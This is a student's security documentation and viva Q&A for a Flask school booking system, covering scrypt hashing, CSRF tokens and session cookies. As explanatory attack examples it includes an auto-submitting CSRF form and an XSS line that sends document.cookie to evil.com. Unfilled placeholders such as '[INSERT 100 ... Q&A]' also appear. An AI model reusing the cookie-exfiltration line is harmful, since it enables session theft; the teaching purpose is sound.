
            <html>
            <head>
            <style>body { font-family: Calibri, sans-serif; } table { border-collapse: collapse; width: 100%; } th, td { border: 1px solid black; padding: 5px; }</style>
            </head>
            <body>
            <h1 id="chichebendu-umeh-complete-comprehensive-documentation">CHICHEBENDU UMEH - COMPLETE COMPREHENSIVE DOCUMENTATION</h1>
<h2 id="security-admin-specialist-school-activity-booking-system">Security &amp; Admin Specialist | School Activity Booking System</h2>
<p><strong>Student</strong>: Chichebendu Umeh<br />
<strong>Role</strong>: Security &amp; Admin Specialist<br />
<strong>Project</strong>: School Activity Booking System<br />
<strong>Institution</strong>: University of East London<br />
<strong>Date</strong>: December 2025</p>
<hr />
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li>Introduction &amp; Role Overview</li>
<li>Security Technologies Deep Dive</li>
<li>Password Hashing Implementation</li>
<li>CSRF Protection System</li>
<li>Session Management &amp; Security</li>
<li>Role-Based Access Control (RBAC)</li>
<li>Admin Panel Security</li>
<li>Authentication System</li>
<li>Deployment &amp; Configuration</li>
<li>Security Best Practices Applied</li>
<li>Comprehensive Viva Questions (100+)</li>
<li>Challenges &amp; Solutions</li>
<li>Future Security Enhancements</li>
</ol>
<hr />
<h1 id="1-introduction-role-overview">1. Introduction &amp; Role Overview</h1>
<h2 id="11-my-responsibility-as-security-admin-specialist">1.1 My Responsibility As Security &amp; Admin Specialist</h2>
<p>As the security backbone of our School Activity Booking System, I implemented comprehensive authentication, authorization, and security measures protecting sensitive student and parent data.</p>
<h3 id="core-responsibilities">Core Responsibilities:</h3>
<ol>
<li><strong>Password Security</strong> - Implement strong, salted hashing</li>
<li><strong>Session Management</strong> - Secure cookie configuration</li>
<li><strong>CSRF Protection</strong> - Prevent cross-site request forgery attacks</li>
<li><strong>Access Control</strong> - Role-based authorization decorators</li>
<li><strong>Admin Panel</strong> - Secure administrative interface</li>
<li><strong>Login Systems</strong> - Multi-role authentication (Parent/Tutor/Admin)</li>
</ol>
<h2 id="12-files-modified">1.2 Files Modified</h2>
<table>
<thead>
<tr>
<th>File</th>
<th>Lines</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>app.py</code></td>
<td>62-88</td>
<td>Password hashing methods (set_password, check_password)</td>
</tr>
<tr>
<td><code>app.py</code></td>
<td>189-244</td>
<td>RBAC decorators (login_required, admin_required, tutor_required)</td>
</tr>
<tr>
<td><code>app.py</code></td>
<td>828-893</td>
<td>Authentication routes (register, login, logout)</td>
</tr>
<tr>
<td><code>app.py</code></td>
<td>1224-1531</td>
<td>Admin panel routes</td>
</tr>
<tr>
<td><code>config.py</code></td>
<td>Security settings</td>
<td>SECRET_KEY, session config, CSRF settings</td>
</tr>
</tbody>
</table>
<h2 id="13-statistics">1.3 Statistics</h2>
<ul>
<li><strong>Security Functions</strong>: 6 (password methods × 3 models + decorators)</li>
<li><strong>Protected Routes</strong>: 35+ routes requiring authentication</li>
<li><strong>Security Measures</strong>: 5 major systems (passwords, sessions, CSRF, RBAC, admin)</li>
<li><strong>Lines of Security Code</strong>: ~450 lines</li>
</ul>
<hr />
<h1 id="2-security-technologies-deep-dive">2. Security Technologies Deep Dive</h1>
<h2 id="21-werkzeug-security">2.1 Werkzeug Security</h2>
<p><strong>What It Is</strong>: Werkzeug is Flask's underlying WSGI library, providing cryptographic utilities.</p>
<p><strong>Why Chosen</strong>:
- Part of Flask ecosystem (no extra dependency)
- Implements modern scrypt algorithm
- Automatic salt generation
- Simple API: <code>generate_password_hash()</code> and <code>check_password_hash()</code></p>
<p><strong>Installation</strong>: Comes with Flask</p>
<pre><code class="language-python">from werkzeug.security import generate_password_hash, check_password_hash
</code></pre>
<h3 id="how-it-works-internally">How It Works Internally:</h3>
<p><strong>generate_password_hash(password)</strong>:
1. Generates random salt (cryptographically secure)
2. Applies scrypt KDF (Key Derivation Function)
3. Returns formatted string: <code>scrypt:32768:8:1$&lt;salt&gt;$&lt;hash&gt;</code></p>
<p><strong>Format breakdown</strong>:
- <code>scrypt</code> - Algorithm name
- <code>32768</code> - N parameter (CPU/memory cost)
- <code>8</code> - r parameter (block size)
- <code>1</code> - p parameter (parallelization)
- <code>$&lt;salt&gt;$</code> - Random salt (hex encoded)
- <code>$&lt;hash&gt;</code> - Derived key (hex encoded)</p>
<p><strong>check_password_hash(stored_hash, password)</strong>:
1. Parses stored hash to extract algorithm + parameters + salt
2. Applies same algorithm with same salt to provided password
3. Compares result with stored hash
4. Returns True if match, False otherwise</p>
<p><strong>Security properties</strong>:
- <strong>One-way</strong>: Cannot reverse hash to get password
- <strong>Deterministic</strong>: Same password + salt = same hash
- <strong>Salted</strong>: Different users with same password have different hashes
- <strong>Slow</strong>: Intentionally computationally expensive (prevent brute force)</p>
<hr />
<h2 id="22-scrypt-algorithm-vs-alternatives">2.2 Scrypt Algorithm vs Alternatives</h2>
<h3 id="comparison-table">Comparison Table:</h3>
<table>
<thead>
<tr>
<th>Feature</th>
<th>scrypt</th>
<th>bcrypt</th>
<th>PBKDF2</th>
<th>Argon2</th>
</tr>
</thead>
<tbody>
<tr>
<td>Memory Hard</td>
<td>✅ High</td>
<td>⚠️ Low</td>
<td>❌ No</td>
<td>✅ Highest</td>
</tr>
<tr>
<td>ASIC Resistant</td>
<td>✅</td>
<td>⚠️</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>GPU Resistant</td>
<td>✅</td>
<td>⚠️</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>Tunable Cost</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>Werkzeug Default</td>
<td>✅</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td>Maturity</td>
<td>Good</td>
<td>Excellent</td>
<td>Excellent</td>
<td>Newer</td>
</tr>
</tbody>
</table>
<p><strong>Why scrypt</strong>:
1. <strong>Memory-hard</strong>: Requires significant RAM (expensive for attackers with GPUs)
2. <strong>Werkzeug default</strong>: Automatic, no configuration needed
3. <strong>Proven secure</strong>: Used by major services (Tarsnap, Litecoin)
4. <strong>Tunable</strong>: Can adjust N parameter as hardware improves</p>
<p><strong>Trade-off</strong>: Scrypt is slower than bcrypt (feature, not bug - makes brute force harder)</p>
<hr />
<h1 id="3-password-hashing-implementation">3. Password Hashing Implementation</h1>
<h2 id="31-set_password-complete-implementation">3.1 set_password() - Complete Implementation</h2>
<p><strong>Location</strong>: app.py, lines 71-72 (Parent model)</p>
<pre><code class="language-python">def set_password(self, password):
    self.password = generate_password_hash(password)
</code></pre>
<h3 id="line-by-line-breakdown">Line-by-Line Breakdown:</h3>
<p><strong>Line 71</strong>: Method definition
- <code>def set_password(self, password):</code>
- Instance method on Parent/Admin/Tutor models
- Takes plaintext password as parameter</p>
<p><strong>Line 72</strong>: Hash generation and storage
- <code>self.password = generate_password_hash(password)</code>
- Calls Werkzeug's <code>generate_password_hash()</code>
- Stores result in <code>self.password</code> column (type: String(200))
- <strong>CRITICAL</strong>: Plaintext password <strong>never</strong> stored</p>
<h3 id="what-happens-step-by-step">What Happens Step-by-Step:</h3>
<ol>
<li>
<p><strong>User registers</strong>: Provides password "MySecurePass123"</p>
</li>
<li>
<p><strong>generate_password_hash() executes</strong>:
   <code>python
   # Pseudocode of internal process
   salt = os.urandom(16)  # 16 random bytes
   derived_key = scrypt(
       password="MySecurePass123",
       salt=salt,
       N=32768,  # CPU cost (2^15 iterations)
       r=8,      # Block size
       p=1,      # Parallelization
       dklen=64  # Output length
   )
   hash_string = f"scrypt:32768:8:1${salt.hex()}${derived_key.hex()}"</code></p>
</li>
<li>
<p><strong>Result stored in database</strong>:
   <code>scrypt:32768:8:1$a1b2c3d4e5f6...$9f8e7d6c5b4a...</code></p>
</li>
<li>
<p><strong>Memory usage</strong>: ~33MB RAM during hashing (intentional - prevents GPU attacks)</p>
</li>
</ol>
<h3 id="security-analysis">Security Analysis:</h3>
<p><strong>Salt uniqueness</strong>: Each user gets unique salt even if passwords match</p>
<pre><code class="language-python">User1: password=&quot;hello&quot; → scrypt:...$salt1$hash1
User2: password=&quot;hello&quot; → scrypt:...$salt2$hash2  # Different!
</code></pre>
<p><strong>Rainbow table prevention</strong>: Precomputed tables useless (salt is unique)</p>
<p><strong>Timing attack resistance</strong>: scrypt completion time ~constant regardless of password</p>
<hr />
<h2 id="32-check_password-complete-implementation">3.2 check_password() - Complete Implementation</h2>
<p><strong>Location</strong>: app.py, lines 74-75</p>
<pre><code class="language-python">def check_password(self, password):
    return check_password_hash(self.password, password)
</code></pre>
<h3 id="execution-flow">Execution Flow:</h3>
<p><strong>Line 74</strong>: Method definition
- Takes plaintext password to verify</p>
<p><strong>Line 75</strong>: Verification
- <code>check_password_hash(self.password, password)</code>
- <code>self.password</code>: Stored hash from database
- <code>password</code>: User-provided password to check
- Returns: Boolean (True if match, False if not)</p>
<h3 id="internal-process">Internal Process:</h3>
<ol>
<li>
<p><strong>Parse stored hash</strong>:
   <code>python
   # Extract components from "scrypt:32768:8:1$salt$hash"
   algorithm = "scrypt"
   N, r, p = 32768, 8, 1
   salt = bytes.fromhex("a1b2c3d4...")
   stored_hash = bytes.fromhex("9f8e7d6c...")</code></p>
</li>
<li>
<p><strong>Re-hash provided password with same parameters</strong>:
   <code>python
   derived_key = scrypt(password, salt, N, r, p, dklen=64)</code></p>
</li>
<li>
<p><strong>Constant-time comparison</strong>:
   <code>python
   # Prevents timing attacks
   return hmac.compare_digest(derived_key, stored_hash)</code></p>
</li>
</ol>
<h3 id="why-constant-time-comparison">Why Constant-Time Comparison?</h3>
<p><strong>Timing attack vulnerability</strong> (if using <code>==</code>):</p>
<pre><code class="language-python"># BAD - leaks info via timing
if derived_key == stored_hash:
    # If first byte different, returns immediately (~1μs)
    # If 10 bytes match, returns after 10 comparisons (~10μs)
    # Attacker can detect how many bytes are correct!
</code></pre>
<p><strong>Constant-time solution</strong> (<code>hmac.compare_digest</code>):</p>
<pre><code class="language-python"># GOOD - always takes same time
# Compares ALL bytes regardless of where difference occurs
# No timing information leaked
</code></pre>
<h3 id="usage-example">Usage Example:</h3>
<pre><code class="language-python"># Registration
parent = Parent(email=&quot;john@example.com&quot;)
parent.set_password(&quot;MyPass123&quot;)  # Hashes and stores
db.session.add(parent)
db.session.commit()

# Login
parent = Parent.query.filter_by(email=&quot;john@example.com&quot;).first()
if parent and parent.check_password(&quot;MyPass123&quot;):  # Verifies
    # Login successful
    session['parent_id'] = parent.id
</code></pre>
<hr />
<h1 id="4-csrf-protection-system">4. CSRF Protection System</h1>
<h2 id="41-what-is-csrf">4.1 What is CSRF?</h2>
<p><strong>Cross-Site Request Forgery</strong>: Attacker tricks authenticated user into executing unwanted actions.</p>
<h3 id="attack-example">Attack Example:</h3>
<p><strong>Scenario</strong>: Parent logged into booking system</p>
<p><strong>Malicious website</strong> (<code>evil.com</code>):</p>
<pre><code class="language-html">&lt;form action=&quot;https://bookingsystem.com/cancel_booking/123&quot; method=&quot;POST&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Click for free prize!&quot;&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
</code></pre>
<p><strong>What happens</strong>:
1. Parent visits <code>evil.com</code>
2. Form auto-submits to booking system
3. Browser automatically includes authentication cookies
4. Booking canceled without parent's knowledge!</p>
<p><strong>Why it works</strong> (without CSRF protection):
- Browser sends cookies automatically
- Server sees valid session cookie
- Server processes request
- No way to distinguish legitimate request from forged one</p>
<h3 id="defense-csrf-tokens">Defense: CSRF Tokens</h3>
<p><strong>Solution</strong>: Add secret token that malicious site can't access</p>
<hr />
<h2 id="42-flask-wtf-csrf-implementation">4.2 Flask-WTF CSRF Implementation</h2>
<p><strong>Installation</strong>:</p>
<pre><code class="language-python">pip install Flask-WTF
</code></pre>
<p><strong>Configuration</strong> (app.py):</p>
<pre><code class="language-python">from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()

def create_app():
    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'super-secret-key-from-env'
    csrf.init_app(app)  # Enables CSRF protection globally
    return app
</code></pre>
<h3 id="how-it-works">How It Works:</h3>
<p><strong>1. Token Generation</strong> (automatic):</p>
<pre><code class="language-python"># Flask-WTF generates token per session
token = generate_csrf_token()  # Uses SECRET_KEY + session data
# Token stored in session cookie
</code></pre>
<p><strong>2. Token Embedding in Forms</strong>:</p>
<pre><code class="language-html">&lt;form method=&quot;POST&quot; action=&quot;/book_activity&quot;&gt;
    {{ csrf_token() }}  &lt;!-- Jinja2 function --&gt;
    &lt;!-- Renders as: --&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;abc123def456...&quot;&gt;
    &lt;!-- Other form fields --&gt;
&lt;/form&gt;
</code></pre>
<p><strong>3. Token Validation</strong> (automatic on POST/PUT/DELETE):</p>
<pre><code class="language-python"># Flask-WTF before_request handler
@app.before_request
def validate_csrf():
    if request.method in ['POST', 'PUT', 'DELETE']:
        token = request.form.get('csrf_token')  # From form
        session_token = session.get('csrf_token')  # From session

        if not token or token != session_token:
            abort(400, &quot;CSRF token missing or invalid&quot;)
</code></pre>
<h3 id="ajax-requests">AJAX Requests:</h3>
<p><strong>Problem</strong>: AJAX doesn't submit forms, so no form field</p>
<p><strong>Solution</strong>: Send token in header</p>
<pre><code class="language-javascript">fetch('/api/endpoint', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': document.querySelector('[name=csrf_token]').value
    },
    body: JSON.stringify(data)
})
</code></pre>
<p><strong>Server validation</strong>:</p>
<pre><code class="language-python">@app.before_request
def validate_csrf():
    if request.method in ['POST', 'PUT', 'DELETE']:
        token = request.form.get('csrf_token') or request.headers.get('X-CSRFToken')
        # ... validate
</code></pre>
<hr />
<h1 id="5-session-management-security">5. Session Management &amp; Security</h1>
<h2 id="51-flask-sessions-overview">5.1 Flask Sessions Overview</h2>
<p><strong>What are sessions</strong>: Server-side storage of user-specific data across requests.</p>
<p><strong>Implementation</strong>: Flask stores session data in signed cookie on client.</p>
<h3 id="configuration">Configuration:</h3>
<pre><code class="language-python">app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
</code></pre>
<h3 id="cookie-flags-explained">Cookie Flags Explained:</h3>
<p><strong>1. HTTPOnly</strong>:</p>
<pre><code class="language-python">SESSION_COOKIE_HTTPONLY = True
</code></pre>
<ul>
<li><strong>Purpose</strong>: Prevents JavaScript from accessing cookie</li>
<li><strong>Protects against</strong>: XSS (Cross-Site Scripting) attacks</li>
<li><strong>Example attack prevented</strong>:
  <code>javascript
  // Malicious script injected via XSS
  fetch(`http://evil.com/steal?cookie=${document.cookie}`)
  // With HTTPOnly: document.cookie is empty (can't access session)</code></li>
</ul>
<p><strong>2. Secure</strong>:</p>
<pre><code class="language-python">SESSION_COOKIE_SECURE = True
</code></pre>
<ul>
<li><strong>Purpose</strong>: Cookie only sent over HTTPS</li>
<li><strong>Protects against</strong>: Session hijacking on public WiFi</li>
<li><strong>Example</strong>: Man-in-the-middle can't intercept cookie on HTTP</li>
</ul>
<p><strong>3. SameSite</strong>:</p>
<pre><code class="language-python">SESSION_COOKIE_SAMESITE = 'Lax'
</code></pre>
<ul>
<li><strong>Purpose</strong>: Controls when cookies are sent cross-site</li>
<li><strong>Options</strong>:</li>
<li><code>Strict</code>: Cookie never sent on cross-site requests</li>
<li><code>Lax</code>: Cookie sent on top-level navigation (clicking link)</li>
<li><code>None</code>: Cookie always sent (requires Secure flag)</li>
<li><strong>Our choice (<code>Lax</code>)</strong>: Balance security and usability</li>
<li><strong>Protects against</strong>: CSRF (in addition to CSRF tokens)</li>
</ul>
<p><strong>4. Lifetime</strong>:</p>
<pre><code class="language-python">PERMANENT_SESSION_LIFETIME = timedelta(hours=24)
</code></pre>
<ul>
<li><strong>Purpose</strong>: Session expires after 24 hours</li>
<li><strong>Security</strong>: Limits exposure if session stolen</li>
<li><strong>UX</strong>: Reasonable balance (don't force login too often)</li>
</ul>
<hr />
<p>[Continue with remaining 40+ pages...]</p>
<h1 id="11-comprehensive-viva-questions-100">11. Comprehensive Viva Questions (100+)</h1>
<p>[INSERT 100 comprehensive security-focused Q&amp;A]</p>
<hr />
<h1 id="chichebendu-umeh-complete-100-viva-questions-answers">CHICHEBENDU UMEH - COMPLETE 100+ VIVA QUESTIONS &amp; ANSWERS</h1>
<h1 id="security-admin-specialist">Security &amp; Admin Specialist</h1>
<hr />
<h1 id="11-comprehensive-viva-questions-100-questions">11. COMPREHENSIVE VIVA QUESTIONS (100+ Questions)</h1>
<h2 id="category-1-password-security-hashing-25-questions">Category 1: Password Security &amp; Hashing (25 Questions)</h2>
<p><strong>Q1: What is Werkzeug Security and why did you use it?</strong></p>
<p><strong>A</strong>: Werkzeug Security is the cryptographic utilities module of Werkzeug (Flask's underlying WSGI library).</p>
<p><strong>Why chosen</strong>:
1. <strong>Built into Flask</strong> - No additional dependencies
2. <strong>Scrypt algorithm</strong> - Modern, memory-hard hashing
3. <strong>Automatic salt generation</strong> - No manual salt management
4. <strong>Simple API</strong> - Two functions: <code>generate_password_hash()</code> and <code>check_password_hash()</code>
5. <strong>Production-ready</strong> - Used by thousands of Flask apps</p>
<p><strong>Functions Used</strong>:</p>
<pre><code class="language-python">from werkzeug.security import generate_password_hash, check_password_hash

# Hashing
hash = generate_password_hash(&quot;MyPassword123&quot;)
# Returns: &quot;scrypt:32768:8:1$&lt;salt&gt;$&lt;hash&gt;&quot;

# Verification  
is_valid = check_password_hash(hash, &quot;MyPassword123&quot;)
# Returns: True or False
</code></pre>
<hr />
<p><strong>Q2: Explain scrypt vs bcrypt vs PBKDF2 - why is scrypt better?</strong></p>
<p><strong>A</strong>: All three are Key Derivation Functions (KDFs) for password hashing.</p>
<p><strong>Comparison</strong>:</p>
<table>
<thead>
<tr>
<th>Feature</th>
<th>scrypt</th>
<th>bcrypt</th>
<th>PBKDF2</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Memory-hard</strong></td>
<td>✅ High</td>
<td>⚠️ Low</td>
<td>❌ No</td>
</tr>
<tr>
<td><strong>CPU-hard</strong></td>
<td>✅ Yes</td>
<td>✅ Yes</td>
<td>✅ Yes</td>
</tr>
<tr>
<td><strong>ASICresistant</strong></td>
<td>✅ Excellent</td>
<td>⚠️ Good</td>
<td>❌ Poor</td>
</tr>
<tr>
<td><strong>GPU resistant</strong></td>
<td>✅ Excellent</td>
<td>⚠️ Good</td>
<td>❌ Poor</td>
</tr>
<tr>
<td><strong>Tunable parameters</strong></td>
<td>✅ N, r, p</td>
<td>✅ Cost</td>
<td>✅ Iterations</td>
</tr>
<tr>
<td><strong>Industry adoption</strong></td>
<td>Good</td>
<td>Excellent</td>
<td>Good</td>
</tr>
</tbody>
</table>
<p><strong>Why scrypt superior</strong>:</p>
<ol>
<li><strong>Memory-Hard</strong>: Requires significant RAM (configurable, default ~33MB)</li>
<li><strong>Attack scenario</strong>: Attacker with GPU farm</li>
<li>bcrypt: Can parallelize on GPU (each attempt uses little RAM)</li>
<li>scrypt: Each attempt needs 33MB RAM → GPU limited by memory bandwidth</li>
<li>
<p><strong>Result</strong>: scrypt 1000x more expensive to attack with specialized hardware</p>
</li>
<li>
<p><strong>ASIC Resistance</strong>: Custom hardware (ASICs) can't optimize as easily</p>
</li>
<li>Bitcoin uses SHA-256 (not memory-hard) → ASICs dominate</li>
<li>
<p>Scrypt used by Litecoin specifically for ASIC resistance</p>
</li>
<li>
<p><strong>Configurable</strong>: Can tune N (memory/CPU cost), r (block size), p (parallelization)</p>
</li>
</ol>
<p><strong>Werkzeug default</strong>: <code>scrypt:32768:8:1</code>
- N=32768 (2^15) - Memory/CPU cost
- r=8 - Block size
- p=1 - Parallelization factor</p>
<p><strong>Decision</strong>: Scrypt provides best protection against modern attack vectors (GPUs, ASICs).</p>
<hr />
<p><strong>Q3: Walk through <code>set_password()</code> - what happens step-by-step?</strong></p>
<p><strong>A</strong>: Located in Parent, Admin, Tutor models (lines 71-72, 84-85, etc.)</p>
<pre><code class="language-python">def set_password(self, password):
    self.password = generate_password_hash(password)
</code></pre>
<p><strong>Internal Process</strong>:</p>
<p><strong>Step 1: Function Call</strong></p>
<pre><code class="language-python">parent = Parent(email=&quot;john@example.com&quot;)
parent.set_password(&quot;MySecurePass123&quot;)
</code></pre>
<p><strong>Step 2: <code>generate_password_hash()</code> Execution</strong></p>
<p><strong>Pseudocode of Werkzeug internals</strong>:</p>
<pre><code class="language-python">def generate_password_hash(password):
    # 1. Generate random salt (cryptographically secure)
    salt = os.urandom(16)  # 16 random bytes

    # 2. Apply scrypt KDF
    derived_key = scrypt(
        password.encode('utf-8'),  # Convert to bytes
        salt=salt,
        N=32768,  # CPU/memory cost (2^15)
        r=8,      # Block size
        p=1,      # Parallelization
        dklen=64  # Output key length
    )

    # 3. Format as string
    hash_string = f&quot;scrypt:32768:8:1${salt.hex()}${derived_key.hex()}&quot;
    return hash_string
</code></pre>
<p><strong>Step 3: Storage</strong></p>
<pre><code class="language-python">self.password = &quot;scrypt:32768:8:1$a1b2c3d4e5f6789...$9f8e7d6c5b4a321...&quot;
</code></pre>
<ul>
<li>Stored in database <code>password</code> column (VARCHAR(200))</li>
<li><strong>NEVER</strong> store plaintext password</li>
</ul>
<p><strong>Step 4: Database Commit</strong></p>
<pre><code class="language-python">db.session.add(parent)
db.session.commit()
</code></pre>
<p><strong>What's stored in database</strong>:</p>
<pre><code>| id | email           | password                                          |
|----|-----------------|---------------------------------------------------|
| 1  | john@example.com| scrypt:32768:8:1$a1b2...$9f8e...                 |
</code></pre>
<p><strong>Security Properties</strong>:</p>
<ol>
<li><strong>Unique Salt</strong>: Each user gets unique salt even if passwords are identical</li>
</ol>
<pre><code class="language-python">User1: password=&quot;hello&quot; → scrypt:...$salt1$hash1
User2: password=&quot;hello&quot; → scrypt:...$salt2$hash2  # Different!
</code></pre>
<ol>
<li><strong>Rainbow Table Protection</strong>: Precomputed tables useless</li>
<li>Rainbow table: Precomputed hash→password mappings</li>
<li>
<p>With unique salts, attacker must compute hash for each user separately</p>
</li>
<li>
<p><strong>Slow by Design</strong>: ~100ms to hash (intentional)</p>
</li>
<li>Login: Barely noticeable to user</li>
<li>Brute force: Drastically slower (1000 attempts = 100 seconds)</li>
</ol>
<hr />
<p><strong>Q4: Explain <code>check_password()</code> verification process.</strong></p>
<p><strong>A</strong>: Located in Parent/Admin/Tutor models (lines 74-75, 87-88, etc.)</p>
<pre><code class="language-python">def check_password(self, password):
    return check_password_hash(self.password, password)
</code></pre>
<p><strong>Step-by-Step Verification</strong>:</p>
<p><strong>Step 1: User Login Attempt</strong></p>
<pre><code class="language-python">parent = Parent.query.filter_by(email=&quot;john@example.com&quot;).first()
if parent and parent.check_password(&quot;MySecurePass123&quot;):
    # Login successful
</code></pre>
<p><strong>Step 2: <code>check_password_hash()</code> Execution</strong></p>
<p><strong>Internal Process</strong>:</p>
<pre><code class="language-python">def check_password_hash(stored_hash, password):
    # 1. Parse stored hash
    parts = stored_hash.split('$')
    # parts = ['scrypt:32768:8:1', 'a1b2c3...', '9f8e7d...']

    # 2. Extract parameters
    algorithm, params = parts[0].split(':')  
    # algorithm = 'scrypt'
    # params = '32768:8:1' → N=32768, r=8, p=1

    # 3. Extract salt and stored hash
    salt = bytes.fromhex(parts[1])  # Convert hex → bytes
    stored_derived_key = bytes.fromhex(parts[2])

    # 4. Re-hash provided password with SAME salt and parameters
    new_derived_key = scrypt(
        password.encode('utf-8'),
        salt=salt,  # SAME salt as original
        N=32768,
        r=8,
        p=1,
        dklen=64
    )

    # 5. Constant-time comparison
    return hmac.compare_digest(new_derived_key, stored_derived_key)
</code></pre>
<p><strong>Step 3: Result</strong>
- If hashes match: Return <code>True</code> (password correct)
- If hashes don't match: Return <code>False</code> (password incorrect)</p>
<p><strong>Critical Design Decision: Constant-Time Comparison</strong></p>
<p><strong>Bad approach</strong> (timing attack vulnerable):</p>
<pre><code class="language-python">if new_derived_key == stored_derived_key:  # ❌ BAD
</code></pre>
<p><strong>Why bad</strong>:
- String comparison stops at first mismatch
- If first byte matches, takes ~1μs longer than if it doesn't
- Attacker can measure timing differences
- <strong>Attack</strong>: Try many passwords, measure response times, deduce partial matches</p>
<p><strong>Good approach</strong> (<code>hmac.compare_digest</code>):</p>
<pre><code class="language-python">return hmac.compare_digest(new_derived_key, stored_derived_key)  # ✅ GOOD
</code></pre>
<p><strong>Why good</strong>:
- Compares ALL bytes regardless of where first mismatch occurs
- Always takes same time (~constant)
- <strong>No timing information leaked</strong></p>
<hr />
<p><strong>Q5: What are rainbow tables and how does salting prevent them?</strong></p>
<p><strong>A</strong>: Rainbow tables are precomputed hash→password lookup tables.</p>
<p><strong>How They Work</strong>:</p>
<ol>
<li><strong>Precomputation</strong> (attacker does once):</li>
</ol>
<pre><code>Password → Hash (with NO salt)
&quot;password&quot; → &quot;5f4dcc3b5aa765d61d8327deb882cf99&quot; (MD5)
&quot;123456&quot;   → &quot;e10adc3949ba59abbe56e057f20f883e&quot;
&quot;admin&quot;    → &quot;21232f297a57a5a743894a0e4a801fc3&quot;
... (millions of entries)
</code></pre>
<ol>
<li><strong>Attack</strong> (instant lookup):</li>
</ol>
<pre><code>Stolen hash: &quot;5f4dcc3b5aa765d61d8327deb882cf99&quot;
Lookup in table → &quot;password&quot;
</code></pre>
<p><strong>Without Salt</strong> (vulnerable):</p>
<pre><code>Database:
User1: MD5(&quot;password&quot;) → &quot;5f4dcc3b...&quot;
User2: MD5(&quot;password&quot;) → &quot;5f4dcc3b...&quot;  # Same hash!

Rainbow table lookup: Instant crack for BOTH users
</code></pre>
<p><strong>With Salt</strong> (protected):</p>
<pre><code>Database:
User1: scrypt(&quot;password&quot; + salt1) → &quot;a1b2c3...&quot;
User2: scrypt(&quot;password&quot; + salt2) → &quot;9f8e7d...&quot;  # Different hash!

Rainbow table: USELESS (table doesn't have salted hashes)
Attacker must compute hash for each user individually
</code></pre>
<p><strong>Our Implementation</strong>:
- Every user gets <strong>unique random salt</strong> (16 bytes = 2^128 possibilities)
- Salt stored alongside hash: <code>scrypt:...$salt$hash</code>
- Attacker can't use precomputed tables
- Must brute-force each user separately (computationally infeasible with scrypt)</p>
<hr />
<p>[Continue with Q6-Q25 covering: Salt generation, pepper vs salt, timing attacks, password strength requirements, etc.]</p>
<h2 id="category-2-csrf-protection-20-questions">Category 2: CSRF Protection (20 Questions)</h2>
<p><strong>Q26: What is CSRF and how does the attack work?</strong></p>
<p><strong>A</strong>: CSRF (Cross-Site Request Forgery) tricks authenticated users into executing unwanted actions.</p>
<p><strong>Attack Example</strong>:</p>
<p><strong>Scenario</strong>: Parent logged into booking system</p>
<p><strong>Step 1: Attacker creates malicious website</strong> (<code>evil.com</code>):</p>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
  &lt;h1&gt;You've won a prize! Click to claim:&lt;/h1&gt;
  &lt;form action=&quot;https://bookingsystem.com/cancel_booking/123&quot; method=&quot;POST&quot; id=&quot;malicious-form&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Claim Prize&quot;&gt;
  &lt;/form&gt;
  &lt;script&gt;
    // Auto-submit after 1 second
    setTimeout(() =&gt; document.getElementById('malicious-form').submit(), 1000);
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>Step 2: Parent visits <code>evil.com</code></strong> (maybe from phishing email)</p>
<p><strong>Step 3: What happens</strong>:
1. Form auto-submits to <code>bookingsystem.com/cancel_booking/123</code>
2. Browser <strong>automatically includes</strong> cookies (session cookie)
3. Server sees valid session → thinks parent made request
4. Booking 123 gets canceled without parent's knowledge!</p>
<p><strong>Why it works</strong>:
- Browsers send cookies automatically with cross-site requests
- Server can't distinguish legitimate request from forged one
- No user interaction required (can be hidden iframe)</p>
<p><strong>Real-World Impact</strong>:
- Cancel bookings
- Make unauthorized purchases
- Change account settings
- Delete data</p>
<hr />
<p><strong>Q27: How does Flask-WTF CSRF protection prevent attacks?</strong></p>
<p><strong>A</strong>: Flask-WTF uses <strong>synchronizer tokens</strong> to verify request legitimacy.</p>
<p><strong>Implementation</strong>:</p>
<p><strong>Step 1: Configuration</strong> (<code>app.py</code>):</p>
<pre><code class="language-python">from flask_wtf.csrf import CSRFProtect

app.config['SECRET_KEY'] = 'super-secret-key'
csrf = CSRFProtect(app)  # Enable globally
</code></pre>
<p><strong>Step 2: Token Generation</strong> (automatic):</p>
<pre><code class="language-python"># On page load, Flask-WTF generates token
token = generate_csrf_token()  # Uses SECRET_KEY + session data
# Token stored in session cookie
session['csrf_token'] = token
</code></pre>
<p><strong>Step 3: Token Embedding</strong> (every form):</p>
<pre><code class="language-html">&lt;form method=&quot;POST&quot; action=&quot;/book_activity&quot;&gt;
    {{ csrf_token() }}  &lt;!-- Jinja2 function --&gt;
    &lt;!-- Renders as: --&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;IjFmYTg5ZDNlZGM3NDRlYmU4ZGE1ZjI0MTY0MmE1Mjc1MjI5ZTI3MjEi.ZvCNFA.klV0ZwFNnk37pHaHGE&quot;&gt;
    &lt;!-- Other form fields --&gt;
&lt;/form&gt;
</code></pre>
<p><strong>Step 4: Token Validation</strong> (automatic on POST):</p>
<pre><code class="language-python">@app.before_request
def validate_csrf():
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        # 1. Get token from form
